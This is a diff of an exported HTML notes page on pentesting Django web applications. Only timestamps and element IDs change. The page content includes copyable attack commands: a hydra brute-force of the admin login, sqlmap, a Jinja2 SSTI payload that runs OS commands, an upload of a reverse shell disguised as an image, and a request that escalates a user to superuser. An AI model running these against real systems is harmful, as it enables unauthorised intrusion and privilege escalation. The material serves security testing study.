@@ -3,7 +3,7 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<!-- 2026-07-30 Thu 22:12 -->
+<!-- 2026-07-30 Thu 22:21 -->
 <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Django Django</title>
@@ -990,7 +990,7 @@ Related: <a href="20260611T064753--web-application-testing-methodology__cybersec
 <div id="outline-container-org2933935" class="outline-2">
 <h2 id="org2933935">Architecture</h2>
 <div class="outline-text-2" id="text-org2933935">
-<pre class="example" id="orgc9b5a91">
+<pre class="example" id="orgcfb8fc9">
 Browser → Nginx → Gunicorn → Django (urls.py → views.py → models.py) → Database
 </pre>
 
@@ -1016,11 +1016,11 @@ or default credentials.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_55687edf819a459995f70b1ff926657f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_99c12c5f810c422d87f8998d645733e3>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_55687edf819a459995f70b1ff926657f=document.querySelector('button[name=btn_55687edf819a459995f70b1ff926657f]');
-copyBtnbtn_55687edf819a459995f70b1ff926657f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl http://$IP/admin/\n`);copyBtnbtn_55687edf819a459995f70b1ff926657f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_55687edf819a459995f70b1ff926657f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_99c12c5f810c422d87f8998d645733e3=document.querySelector('button[name=btn_99c12c5f810c422d87f8998d645733e3]');
+copyBtnbtn_99c12c5f810c422d87f8998d645733e3.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl http://$IP/admin/\n`);copyBtnbtn_99c12c5f810c422d87f8998d645733e3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_99c12c5f810c422d87f8998d645733e3.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1034,11 +1034,11 @@ lockout is not enabled by default:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f0db8978e47849babce7ad7eed708de6>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_54c5baf417514dc8a170881e7508e402>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_f0db8978e47849babce7ad7eed708de6=document.querySelector('button[name=btn_f0db8978e47849babce7ad7eed708de6]');
-copyBtnbtn_f0db8978e47849babce7ad7eed708de6.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  http-post-form \\\n  \"$IP/admin/login/:username=^USER^&password=^PASS^&csrfmiddlewaretoken=<token>:Please enter the correct\"\n`);copyBtnbtn_f0db8978e47849babce7ad7eed708de6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f0db8978e47849babce7ad7eed708de6.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_54c5baf417514dc8a170881e7508e402=document.querySelector('button[name=btn_54c5baf417514dc8a170881e7508e402]');
+copyBtnbtn_54c5baf417514dc8a170881e7508e402.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n  http-post-form \\\n  \"$IP/admin/login/:username=^USER^&password=^PASS^&csrfmiddlewaretoken=<token>:Please enter the correct\"\n`);copyBtnbtn_54c5baf417514dc8a170881e7508e402.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_54c5baf417514dc8a170881e7508e402.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1062,7 +1062,7 @@ Django's ORM parameterises queries by default, making standard
 SQLi difficult. However, raw queries bypass this protection:
 </p>
 
-<pre class="example" id="org97df7fe">
+<pre class="example" id="org41c9698">
 # Vulnerable
 User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")
 
@@ -1076,11 +1076,11 @@ in performance-sensitive code paths:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a4bcf2ab9e2d4cccade5abe079821b07>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3204397e4a934adc9ddf33e47c0b3709>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_a4bcf2ab9e2d4cccade5abe079821b07=document.querySelector('button[name=btn_a4bcf2ab9e2d4cccade5abe079821b07]');
-copyBtnbtn_a4bcf2ab9e2d4cccade5abe079821b07.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`sqlmap -u \"http://$IP/search/?q=test\" --dbs\n`);copyBtnbtn_a4bcf2ab9e2d4cccade5abe079821b07.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a4bcf2ab9e2d4cccade5abe079821b07.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_3204397e4a934adc9ddf33e47c0b3709=document.querySelector('button[name=btn_3204397e4a934adc9ddf33e47c0b3709]');
+copyBtnbtn_3204397e4a934adc9ddf33e47c0b3709.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`sqlmap -u \"http://$IP/search/?q=test\" --dbs\n`);copyBtnbtn_3204397e4a934adc9ddf33e47c0b3709.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3204397e4a934adc9ddf33e47c0b3709.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1099,11 +1099,11 @@ instead, which is exploitable.
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_26a0feb0a92c404196911e3b4997795e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_a2b6c0ed3c334e06b5fef19ea4a5752b>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_26a0feb0a92c404196911e3b4997795e=document.querySelector('button[name=btn_26a0feb0a92c404196911e3b4997795e]');
-copyBtnbtn_26a0feb0a92c404196911e3b4997795e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Test for SSTI\ncurl \"http://$IP/page/?name={{7*7}}\"\n`);copyBtnbtn_26a0feb0a92c404196911e3b4997795e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_26a0feb0a92c404196911e3b4997795e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_a2b6c0ed3c334e06b5fef19ea4a5752b=document.querySelector('button[name=btn_a2b6c0ed3c334e06b5fef19ea4a5752b]');
+copyBtnbtn_a2b6c0ed3c334e06b5fef19ea4a5752b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Test for SSTI\ncurl \"http://$IP/page/?name={{7*7}}\"\n`);copyBtnbtn_a2b6c0ed3c334e06b5fef19ea4a5752b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a2b6c0ed3c334e06b5fef19ea4a5752b.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1117,7 +1117,7 @@ If the response contains <code>49</code>, SSTI is confirmed. Jinja2 SSTI
 can lead to RCE via Python object traversal:
 </p>
 
-<pre class="example" id="org5c7bbe8">
+<pre class="example" id="org0ae8b5d">
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
 </pre>
 </div>
@@ -1151,7 +1151,7 @@ Django templates auto-escape output by default. Escaping can
 be disabled with the <code>safe</code> filter or <code>{% autoescape off %}</code>:
 </p>
 
-<pre class="example" id="org8b1928b">
+<pre class="example" id="orgada5f48">
 {{ user_input|safe }}
 {% autoescape off %}{{ user_input }}{% endautoescape %}
 </pre>
@@ -1176,11 +1176,11 @@ apps. It should never be enabled in production.
 Trigger an error to check:
 </p>
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_8d8187909f114a6a9183be255beabdc5>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_e8dc568e70614efe85df9f7991aa6bea>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_8d8187909f114a6a9183be255beabdc5=document.querySelector('button[name=btn_8d8187909f114a6a9183be255beabdc5]');
-copyBtnbtn_8d8187909f114a6a9183be255beabdc5.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl \"http://$IP/nonexistent-path-that-causes-404\"\ncurl \"http://$IP/?id='\"\n`);copyBtnbtn_8d8187909f114a6a9183be255beabdc5.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_8d8187909f114a6a9183be255beabdc5.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_e8dc568e70614efe85df9f7991aa6bea=document.querySelector('button[name=btn_e8dc568e70614efe85df9f7991aa6bea]');
+copyBtnbtn_e8dc568e70614efe85df9f7991aa6bea.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl \"http://$IP/nonexistent-path-that-causes-404\"\ncurl \"http://$IP/?id='\"\n`);copyBtnbtn_e8dc568e70614efe85df9f7991aa6bea.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_e8dc568e70614efe85df9f7991aa6bea.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1206,7 +1206,7 @@ A Django debug error page reveals:
 <p>
 Django views commonly use integer primary keys in URLs:
 </p>
-<pre class="example" id="orgd27263d">
+<pre class="example" id="orge6108e8">
 /api/users/1/
 /api/orders/42/
 </pre>
@@ -1227,11 +1227,11 @@ authentication:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ea50b66dd3d648409f8b6f4c6edd991e>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_39d736dbf87e4486826a440549c53513>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_ea50b66dd3d648409f8b6f4c6edd991e=document.querySelector('button[name=btn_ea50b66dd3d648409f8b6f4c6edd991e]');
-copyBtnbtn_ea50b66dd3d648409f8b6f4c6edd991e.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl -H \"Accept: text/html\" http://$IP/api/\n`);copyBtnbtn_ea50b66dd3d648409f8b6f4c6edd991e.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ea50b66dd3d648409f8b6f4c6edd991e.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_39d736dbf87e4486826a440549c53513=document.querySelector('button[name=btn_39d736dbf87e4486826a440549c53513]');
+copyBtnbtn_39d736dbf87e4486826a440549c53513.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl -H \"Accept: text/html\" http://$IP/api/\n`);copyBtnbtn_39d736dbf87e4486826a440549c53513.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_39d736dbf87e4486826a440549c53513.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1244,7 +1244,7 @@ Also check DRF permission classes — <code>AllowAny</code> on sensitive
 endpoints is a common misconfiguration:
 </p>
 
-<pre class="example" id="orge873077">
+<pre class="example" id="org1b57754">
 # Overly permissive
 permission_classes = [AllowAny]
 
@@ -1269,11 +1269,11 @@ accessible via browser</li>
 </ul>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_aad0f317406b4db1aff5ac2a16c9c77f>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_90043e43d02c4aabafd8442974c610ff>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_aad0f317406b4db1aff5ac2a16c9c77f=document.querySelector('button[name=btn_aad0f317406b4db1aff5ac2a16c9c77f]');
-copyBtnbtn_aad0f317406b4db1aff5ac2a16c9c77f.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`# Try uploading a Python reverse shell disguised as an image\ncurl -X POST http://$IP/upload/ \\\n  -F \"file=@shell.py;type=image/jpeg\"\n`);copyBtnbtn_aad0f317406b4db1aff5ac2a16c9c77f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_aad0f317406b4db1aff5ac2a16c9c77f.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_90043e43d02c4aabafd8442974c610ff=document.querySelector('button[name=btn_90043e43d02c4aabafd8442974c610ff]');
+copyBtnbtn_90043e43d02c4aabafd8442974c610ff.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Try uploading a Python reverse shell disguised as an image\ncurl -X POST http://$IP/upload/ \\\n  -F \"file=@shell.py;type=image/jpeg\"\n`);copyBtnbtn_90043e43d02c4aabafd8442974c610ff.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_90043e43d02c4aabafd8442974c610ff.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
@@ -1293,11 +1293,11 @@ read-only. Test by sending extra fields in POST/PUT requests:
 </p>
 
 <div class='org-src-wrapper'>
-<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b0bffd9ecb2a4f1a80a42e95dc69eb94>&#10697;</button>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_4dd5a0a0730e421f9d9750e46adc53f6>&#10697;</button>
 <script type='text/javascript'>
-var copyBtnbtn_b0bffd9ecb2a4f1a80a42e95dc69eb94=document.querySelector('button[name=btn_b0bffd9ecb2a4f1a80a42e95dc69eb94]');
-copyBtnbtn_b0bffd9ecb2a4f1a80a42e95dc69eb94.addEventListener('click', function(event) {
-let res = copyTextToClipboard(`curl -X PATCH http://$IP/api/users/1/ \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d '{\"is_staff\":true,\"is_superuser\":true}'\n`);copyBtnbtn_b0bffd9ecb2a4f1a80a42e95dc69eb94.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b0bffd9ecb2a4f1a80a42e95dc69eb94.innerHTML = '&#10697;'}, 3000);
+var copyBtnbtn_4dd5a0a0730e421f9d9750e46adc53f6=document.querySelector('button[name=btn_4dd5a0a0730e421f9d9750e46adc53f6]');
+copyBtnbtn_4dd5a0a0730e421f9d9750e46adc53f6.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`curl -X PATCH http://$IP/api/users/1/ \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -d '{\"is_staff\":true,\"is_superuser\":true}'\n`);copyBtnbtn_4dd5a0a0730e421f9d9750e46adc53f6.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4dd5a0a0730e421f9d9750e46adc53f6.innerHTML = '&#10697;'}, 3000);
 });
 </script>
 </div><div class="org-src-container">
